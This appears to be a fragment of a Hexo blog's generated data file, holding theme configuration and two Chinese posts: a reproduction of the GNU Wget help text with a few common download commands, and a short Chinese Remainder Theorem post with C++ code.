"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":6102,"excerpt":"<h1 id=\"使用帮助\"><a href=\"#使用帮助\" class=\"headerlink\" title=\"使用帮助\"></a>使用帮助</h1><p>GNU Wget 1.11.4，非交互式的网络文件下载工具。<br>用法： wget [选项]… [URL]…<br>Mandatory arguments to long options are mandatory for short options too.</p>\n<h2 id=\"Wget-for-Windows\"><a href=\"#Wget-for-Windows\" class=\"headerlink\" title=\"Wget for Windows\"></a>Wget for Windows</h2><p>官网：<a href=\"http://gnuwin32.sourceforge.net/packages/wget.htm\">http://gnuwin32.sourceforge.net/packages/wget.htm</a><br>下载地址：<a href=\"http://downloads.sourceforge.net/gnuwin32/wget-1.11.4-1-setup.exe\">http://downloads.sourceforge.net/gnuwin32/wget-1.11.4-1-setup.exe</a><br>","more":"</p>\n<h2 id=\"Wget-—-—help\"><a href=\"#Wget-—-—help\" class=\"headerlink\" title=\"Wget — —help\"></a>Wget — —help</h2><figure class=\"highlight cmake\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Startup:</span><br><span class=\"line\">  -V,  --version           display the version of Wget <span class=\"keyword\">and</span> exit.</span><br><span class=\"line\">  -h,  --help              print this help.</span><br><span class=\"line\">  -b,  --background        go to background after startup.</span><br><span class=\"line\">  -e,  --execute=<span class=\"keyword\">COMMAND</span>   execute a `.wgetrc&#x27;-style <span class=\"keyword\">command</span>.</span><br><span class=\"line\"></span><br><span class=\"line\">Logging <span class=\"keyword\">and</span> input <span class=\"keyword\">file</span>:</span><br><span class=\"line\">  -o,  --output-<span class=\"keyword\">file</span>=<span class=\"keyword\">FILE</span>    log messages to <span class=\"keyword\">FILE</span>.</span><br><span class=\"line\">  -a,  --append-output=<span class=\"keyword\">FILE</span>  append messages to <span class=\"keyword\">FILE</span>.</span><br><span class=\"line\">  -d,  --debug               print lots of debugging information.</span><br><span class=\"line\">  -q,  --quiet               quiet (no output).</span><br><span class=\"line\">  -v,  --verbose             be verbose (this is the default).</span><br><span class=\"line\">  -nv, --no-verbose          turn <span class=\"keyword\">off</span> verboseness, without being quiet.</span><br><span class=\"line\">  -i,  --input-<span class=\"keyword\">file</span>=<span class=\"keyword\">FILE</span>     download URLs found in <span class=\"keyword\">FILE</span>.</span><br><span class=\"line\">  -F,  --force-html          treat input <span class=\"keyword\">file</span> as HTML.</span><br><span class=\"line\">  -B,  --base=URL            prepends URL to relative links in -F -i <span class=\"keyword\">file</span>.</span><br><span class=\"line\"></span><br><span class=\"line\">Download:</span><br><span class=\"line\">  -t,  --tries=NUMBER            <span class=\"keyword\">set</span> number of retries to NUMBER (<span class=\"number\">0</span> unlimits).</span><br><span class=\"line\">       --retry-connrefused       retry even <span class=\"keyword\">if</span> connection is refused.</span><br><span class=\"line\">  -O,  --output-document=<span class=\"keyword\">FILE</span>    write documents to <span class=\"keyword\">FILE</span>.</span><br><span class=\"line\">  -nc, --no-clobber              skip downloads that would download to</span><br><span class=\"line\">                                 existing files.</span><br><span class=\"line\">  -c,  --<span class=\"keyword\">continue</span>                resume getting a partially-downloaded <span class=\"keyword\">file</span>.</span><br><span class=\"line\">       --progress=TYPE           select progress gauge type.</span><br><span class=\"line\">  -N,  --timestamping            don&#x27;t re-retrieve files unless newer than</span><br><span class=\"line\">                                 local.</span><br><span class=\"line\">  -S,  --server-response         print server response.</span><br><span class=\"line\">       --spider                  don&#x27;t download anything.</span><br><span class=\"line\">  -T,  --timeout=SECONDS         <span class=\"keyword\">set</span> all timeout values to SECONDS.</span><br><span class=\"line\">       --dns-timeout=SECS        <span class=\"keyword\">set</span> the DNS lookup timeout to SECS.</span><br><span class=\"line\">       --connect-timeout=SECS    <span class=\"keyword\">set</span> the connect timeout to SECS.</span><br><span class=\"line\">       --read-timeout=SECS       <span class=\"keyword\">set</span> the read timeout to SECS.</span><br><span class=\"line\">  -w,  --wait=SECONDS            wait SECONDS between retrievals.</span><br><span class=\"line\">       --waitretry=SECONDS       wait <span class=\"number\">1</span>..SECONDS between retries of a retrieval.</span><br><span class=\"line\">       --random-wait             wait from <span class=\"number\">0</span>...<span class=\"number\">2</span>*WAIT secs between retrievals.</span><br><span class=\"line\">       --no-proxy                explicitly turn <span class=\"keyword\">off</span> proxy.</span><br><span class=\"line\">  -Q,  --quota=NUMBER            <span class=\"keyword\">set</span> retrieval quota to NUMBER.</span><br><span class=\"line\">       --bind-address=ADDRESS    bind to ADDRESS (hostname <span class=\"keyword\">or</span> IP) <span class=\"keyword\">on</span> local host.</span><br><span class=\"line\">       --limit-rate=RATE         limit download rate to RATE.</span><br><span class=\"line\">       --no-dns-cache            disable caching DNS lookups.</span><br><span class=\"line\">       --restrict-<span class=\"keyword\">file</span>-names=OS  restrict chars in <span class=\"keyword\">file</span> names to ones OS allows.</span><br><span class=\"line\">       --ignore-case             ignore case when matching files/directories.</span><br><span class=\"line\">  -<span class=\"number\">4</span>,  --inet4-only              connect only to IPv4 addresses.</span><br><span class=\"line\">  -<span class=\"number\">6</span>,  --inet6-only              connect only to IPv6 addresses.</span><br><span class=\"line\">       --prefer-family=FAMILY    connect first to addresses of specified family,</span><br><span class=\"line\">                                 one of IPv6, IPv4, <span class=\"keyword\">or</span> none.</span><br><span class=\"line\">       --user=USER               <span class=\"keyword\">set</span> both ftp <span class=\"keyword\">and</span> http user to USER.</span><br><span class=\"line\">       --password=PASS           <span class=\"keyword\">set</span> both ftp <span class=\"keyword\">and</span> http password to PASS.</span><br><span class=\"line\"></span><br><span class=\"line\">Directories:</span><br><span class=\"line\">  -nd, --no-directories           don&#x27;t create directories.</span><br><span class=\"line\">  -x,  --force-directories        force creation of directories.</span><br><span class=\"line\">  -nH, --no-host-directories      don&#x27;t create host directories.</span><br><span class=\"line\">       --protocol-directories     use protocol name in directories.</span><br><span class=\"line\">  -P,  --directory-prefix=PREFIX  save files to PREFIX/...</span><br><span class=\"line\">       --cut-dirs=NUMBER          ignore NUMBER remote directory components.</span><br><span class=\"line\"></span><br><span class=\"line\">HTTP options:</span><br><span class=\"line\">       --http-user=USER        <span class=\"keyword\">set</span> http user to USER.</span><br><span class=\"line\">       --http-password=PASS    <span class=\"keyword\">set</span> http password to PASS.</span><br><span class=\"line\">       --no-cache              disallow server-cached data.</span><br><span class=\"line\">  -E,  --html-extension        save HTML documents with `.html&#x27; extension.</span><br><span class=\"line\">       --ignore-length         ignore `Content-Length&#x27; header field.</span><br><span class=\"line\">       --header=<span class=\"keyword\">STRING</span>         insert <span class=\"keyword\">STRING</span> among the headers.</span><br><span class=\"line\">       --max-redirect          maximum redirections allowed per page.</span><br><span class=\"line\">       --proxy-user=USER       <span class=\"keyword\">set</span> USER as proxy username.</span><br><span class=\"line\">       --proxy-password=PASS   <span class=\"keyword\">set</span> PASS as proxy password.</span><br><span class=\"line\">       --referer=URL           <span class=\"keyword\">include</span> `Referer: URL&#x27; header in HTTP request.</span><br><span class=\"line\">       --save-headers          save the HTTP headers to <span class=\"keyword\">file</span>.</span><br><span class=\"line\">  -U,  --user-agent=AGENT      identify as AGENT instead of Wget/VERSION.</span><br><span class=\"line\">       --no-http-keep-alive    disable HTTP keep-alive (persistent connections).</span><br><span class=\"line\">       --no-cookies            don&#x27;t use cookies.</span><br><span class=\"line\">       --load-cookies=<span class=\"keyword\">FILE</span>     load cookies from <span class=\"keyword\">FILE</span> before session.</span><br><span class=\"line\">       --save-cookies=<span class=\"keyword\">FILE</span>     save cookies to <span class=\"keyword\">FILE</span> after session.</span><br><span class=\"line\">       --keep-session-cookies  load <span class=\"keyword\">and</span> save session (non-permanent) cookies.</span><br><span class=\"line\">       --post-data=<span class=\"keyword\">STRING</span>      use the POST method; send <span class=\"keyword\">STRING</span> as the data.</span><br><span class=\"line\">       --post-<span class=\"keyword\">file</span>=<span class=\"keyword\">FILE</span>        use the POST method; send contents of <span class=\"keyword\">FILE</span>.</span><br><span class=\"line\">       --content-disposition   honor the Content-Disposition header when</span><br><span class=\"line\">                               choosing local <span class=\"keyword\">file</span> names (EXPERIMENTAL).</span><br><span class=\"line\">       --auth-no-challenge     Send Basic HTTP authentication information</span><br><span class=\"line\">                               without first waiting for the server&#x27;s</span><br><span class=\"line\">                               challenge.</span><br><span class=\"line\"></span><br><span class=\"line\">HTTPS (SSL/TLS) options:</span><br><span class=\"line\">       --secure-protocol=PR     choose secure protocol, one of auto, SSLv2,</span><br><span class=\"line\">                                SSLv3, <span class=\"keyword\">and</span> TLSv1.</span><br><span class=\"line\">       --no-check-certificate   don&#x27;t validate the server&#x27;s certificate.</span><br><span class=\"line\">       --certificate=<span class=\"keyword\">FILE</span>       client certificate <span class=\"keyword\">file</span>.</span><br><span class=\"line\">       --certificate-type=TYPE  client certificate type, PEM <span class=\"keyword\">or</span> DER.</span><br><span class=\"line\">       --private-key=<span class=\"keyword\">FILE</span>       private key <span class=\"keyword\">file</span>.</span><br><span class=\"line\">       --private-key-type=TYPE  private key type, PEM <span class=\"keyword\">or</span> DER.</span><br><span class=\"line\">       --ca-certificate=<span class=\"keyword\">FILE</span>    <span class=\"keyword\">file</span> with the bundle of CA&#x27;s.</span><br><span class=\"line\">       --ca-directory=DIR       directory where hash <span class=\"keyword\">list</span> of CA&#x27;s is stored.</span><br><span class=\"line\">       --random-<span class=\"keyword\">file</span>=<span class=\"keyword\">FILE</span>       <span class=\"keyword\">file</span> with random data for seeding the SSL PRNG.</span><br><span class=\"line\">       --egd-<span class=\"keyword\">file</span>=<span class=\"keyword\">FILE</span>          <span class=\"keyword\">file</span> naming the EGD socket with random data.</span><br><span class=\"line\"></span><br><span class=\"line\">FTP options:</span><br><span class=\"line\">       --ftp-user=USER         <span class=\"keyword\">set</span> ftp user to USER.</span><br><span class=\"line\">       --ftp-password=PASS     <span class=\"keyword\">set</span> ftp password to PASS.</span><br><span class=\"line\">       --no-<span class=\"keyword\">remove</span>-listing     don&#x27;t <span class=\"keyword\">remove</span> `.listing&#x27; files.</span><br><span class=\"line\">       --no-glob               turn <span class=\"keyword\">off</span> FTP <span class=\"keyword\">file</span> name globbing.</span><br><span class=\"line\">       --no-passive-ftp        disable the <span class=\"string\">&quot;passive&quot;</span> transfer mode.</span><br><span class=\"line\">       --retr-symlinks         when recursing, get linked-to files (<span class=\"keyword\">not</span> dir).</span><br><span class=\"line\">       --preserve-permissions  preserve remote <span class=\"keyword\">file</span> permissions.</span><br><span class=\"line\"></span><br><span class=\"line\">Recursive download:</span><br><span class=\"line\">  -r,  --recursive          specify recursive download.</span><br><span class=\"line\">  -l,  --level=NUMBER       maximum recursion depth (inf <span class=\"keyword\">or</span> <span class=\"number\">0</span> for infinite).</span><br><span class=\"line\">       --delete-after       delete files locally after downloading them.</span><br><span class=\"line\">  -k,  --convert-links      make links in downloaded HTML point to local files.</span><br><span class=\"line\">  -K,  --backup-converted   before converting <span class=\"keyword\">file</span> X, back up as X.orig.</span><br><span class=\"line\">  -m,  --mirror             shortcut for -N -r -l inf --no-<span class=\"keyword\">remove</span>-listing.</span><br><span class=\"line\">  -p,  --page-requisites    get all images, etc. needed to display HTML page.</span><br><span class=\"line\">       --strict-comments    turn <span class=\"keyword\">on</span> strict (SGML) handling of HTML comments.</span><br><span class=\"line\"></span><br><span class=\"line\">Recursive accept/reject:</span><br><span class=\"line\">  -A,  --accept=<span class=\"keyword\">LIST</span>               comma-separated <span class=\"keyword\">list</span> of accepted extensions.</span><br><span class=\"line\">  -R,  --reject=<span class=\"keyword\">LIST</span>               comma-separated <span class=\"keyword\">list</span> of rejected extensions.</span><br><span class=\"line\">  -D,  --domains=<span class=\"keyword\">LIST</span>              comma-separated <span class=\"keyword\">list</span> of accepted domains.</span><br><span class=\"line\">       --exclude-domains=<span class=\"keyword\">LIST</span>      comma-separated <span class=\"keyword\">list</span> of rejected domains.</span><br><span class=\"line\">       --follow-ftp                follow FTP links from HTML documents.</span><br><span class=\"line\">       --follow-tags=<span class=\"keyword\">LIST</span>          comma-separated <span class=\"keyword\">list</span> of followed HTML tags.</span><br><span class=\"line\">       --ignore-tags=<span class=\"keyword\">LIST</span>          comma-separated <span class=\"keyword\">list</span> of ignored HTML tags.</span><br><span class=\"line\">  -H,  --span-hosts                go to foreign hosts when recursive.</span><br><span class=\"line\">  -L,  --relative                  follow relative links only.</span><br><span class=\"line\">  -I,  --<span class=\"keyword\">include</span>-directories=<span class=\"keyword\">LIST</span>  <span class=\"keyword\">list</span> of allowed directories.</span><br><span class=\"line\">  -X,  --exclude-directories=<span class=\"keyword\">LIST</span>  <span class=\"keyword\">list</span> of excluded directories.</span><br><span class=\"line\">  -np, --no-parent                 don&#x27;t ascend to the parent directory.</span><br></pre></td></tr></table></figure>\n<h2 id=\"常用Wget指令\"><a href=\"#常用Wget指令\" class=\"headerlink\" title=\"常用Wget指令\"></a>常用Wget指令</h2><figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://xxx.cn\t\t\t\t\t//下载网页源代码</span><br><span class=\"line\">wget -r http://xxx.cn\t\t\t\t\t//递归下载网站源代码</span><br><span class=\"line\">wget -r --no-cookie --no-check-certificate\t\t//忽略SSL证书验证</span><br><span class=\"line\">wget -c -r -p -k http://xxx.cn\t\t\t\t//断点续传，整站下载</span><br></pre></td></tr></table></figure>"},{"title":"中国剩余定理","date":"2019-03-29T09:11:09.000Z","abbrlink":"2cf738e6","updated":"2020-05-11T09:46:14.844Z","_content":"# 原理\n未完待续\n# 题目\n未完待续\n<!--more-->\n# 代码\n```cpp\n#include<iostream>\ntypedef long long ll;\nusing namespace std;\nll yu[120],chu[120];\nll exgcd(ll a,ll b,ll &x,ll &y)\n{\n    if(b==0)\n    {\n        x=1,y=0;\n        return a;\n    }\n    else\n    {\n        ll res=exgcd(b,a%b,y,x);\n        y-=x*(a/b);\n        return res;\n    }\n}\nll china(int l)\n{\n    ll d,x,y,m,n=1,ret=0;\n    for(int i=0;i<l;i++)\n        n*=chu[i];\n    for(int i=0;i<l;i++)\n    {\n        m=n/chu[i];\n        d=exgcd(chu[i],m,x,y);\n        ret=(ret+y*m*yu[i])%n;\n    }\n    return (n+ret%n)%n;\n}\nint main()\n{\n    int N;\n    cin>>N;\n    for(int i=0;i<N;i++)\n        cin>>chu[i]>>yu[i];\n    cout<<china(N)<<endl;\n    return 0;\n}\n```","source":"_posts/中国剩余定理.md","raw":"---\ntitle: 中国剩余定理\ndate: 2019-03-29 17:11:09\ncategories:\n  - Algorithm\ntags:\n  - 中国剩余定理\nabbrlink: 2cf738e6\nupdated:\n---\n# 原理\n未完待续\n# 题目\n未完待续\n<!--more-->\n# 代码\n```cpp\n#include<iostream>\ntypedef long long ll;\nusing namespace std;\nll yu[120],chu[120];\nll exgcd(ll a,ll b,ll &x,ll &y)\n{\n    if(b==0)\n    {\n        x=1,y=0;\n        return a;\n    }\n    else\n    {\n        ll res=exgcd(b,a%b,y,x);\n        y-=x*(a/b);\n        return res;\n    }\n}\nll china(int l)\n{\n    ll d,x,y,m,n=1,ret=0;\n    for(int i=0;i<l;i++)\n        n*=chu[i];\n    for(int i=0;i<l;i++)\n    {\n        m=n/chu[i];\n        d=exgcd(chu[i],m,x,y);\n        ret=(ret+y*m*yu[i])%n;\n    }\n    return (n+ret%n)%n;\n}\nint main()\n{\n    int N;\n    cin>>N;\n    for(int i=0;i<N;i++)\n        cin>>chu[i]>>yu[i];\n    cout<<china(N)<<endl;\n    return 0;\n}\n```","slug":"中国剩余定理","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkbz002rqse5au2a3a5h","content":"<h1 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h1><p>未完待续</p>\n<h1 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h1><p>未完待续<br><a id=\"more\"></a></p>\n<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> ll;</span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\">ll yu[<span class=\"number\">120</span>],chu[<span class=\"number\">120</span>];</span><br><span class=\"line\"><span class=\"function\">ll <span class=\"title\">exgcd</span><span class=\"params\">(ll a,ll b,ll &amp;x,ll &amp;y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(b==<span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        x=<span class=\"number\">1</span>,y=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> a;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ll res=exgcd(b,a%b,y,x);</span><br><span class=\"line\">        y-=x*(a/b);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">ll <span class=\"title\">china</span><span class=\"params\">(<span class=\"keyword\">int</span> l)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    ll d,x,y,m,n=<span class=\"number\">1</span>,ret=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;l;i++)</span><br><span class=\"line\">        n*=chu[i];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;l;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        m=n/chu[i];</span><br><span class=\"line\">        d=exgcd(chu[i],m,x,y);</span><br><span class=\"line\">        ret=(ret+y*m*yu[i])%n;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (n+ret%n)%n;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> N;</span><br><span class=\"line\">    <span class=\"built_in\">cin</span>&gt;&gt;N;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;N;i++)</span><br><span class=\"line\">        <span class=\"built_in\">cin</span>&gt;&gt;chu[i]&gt;&gt;yu[i];</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;china(N)&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || 